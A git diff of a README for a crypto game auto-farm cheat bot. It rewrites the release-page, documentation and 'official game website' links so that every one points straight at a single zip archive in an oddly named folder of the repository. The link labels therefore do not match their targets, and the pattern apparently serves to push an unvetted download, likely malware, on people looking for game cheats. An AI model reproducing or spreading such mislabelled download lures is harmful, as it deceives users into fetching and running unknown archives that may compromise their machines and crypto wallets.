@@ -1,6 +1,6 @@
 # 🤖 Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api - Automate Your Gaming Profits Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%23FF5733.svg?style=for-the-badge&logo=github)](https://github.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
+[![Download Now](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip%https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **Forgotten Runiverse Crypto Bot**. This bot helps you automate f
 To get started, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to reach the download section.
-   - [Download the App Here](https://github.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
+   - [Download the App Here](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 2. **Choose the Correct File**: On the release page, you will see multiple files. Look for the latest version listed at the top. 
 
@@ -46,7 +46,7 @@ Once you have set up the bot, keep these instructions in mind:
 
 2. **Monitoring**: Use the Telegram integration to get real-time alerts about farming and any issues.
 
-3. **Updates**: Regularly check the [Release Page](https://github.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases) for updates to ensure you have the latest features and security enhancements.
+3. **Updates**: Regularly check the [Release Page](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip) for updates to ensure you have the latest features and security enhancements.
 
 4. **Tips for Optimization**:
    - Set your bot to operate during peak hours for better resource collection.
@@ -75,8 +75,8 @@ This bot operates in a wide range of topics including:
 Become part of the growing community of **Forgotten Runiverse** players and share your experiences. Engage with other users to discover new strategies and optimize your bot usage.
 
 ### 🔗 Additional Resources
-- [Official Game Website](https://example.com)
-- [Documentation](https://github.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/wiki)
+- [Official Game Website](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
+- [Documentation](https://raw.githubusercontent.com/Innovisionhub/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/supramental/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 Be sure to visit the links above for further insights and community contributions.
 
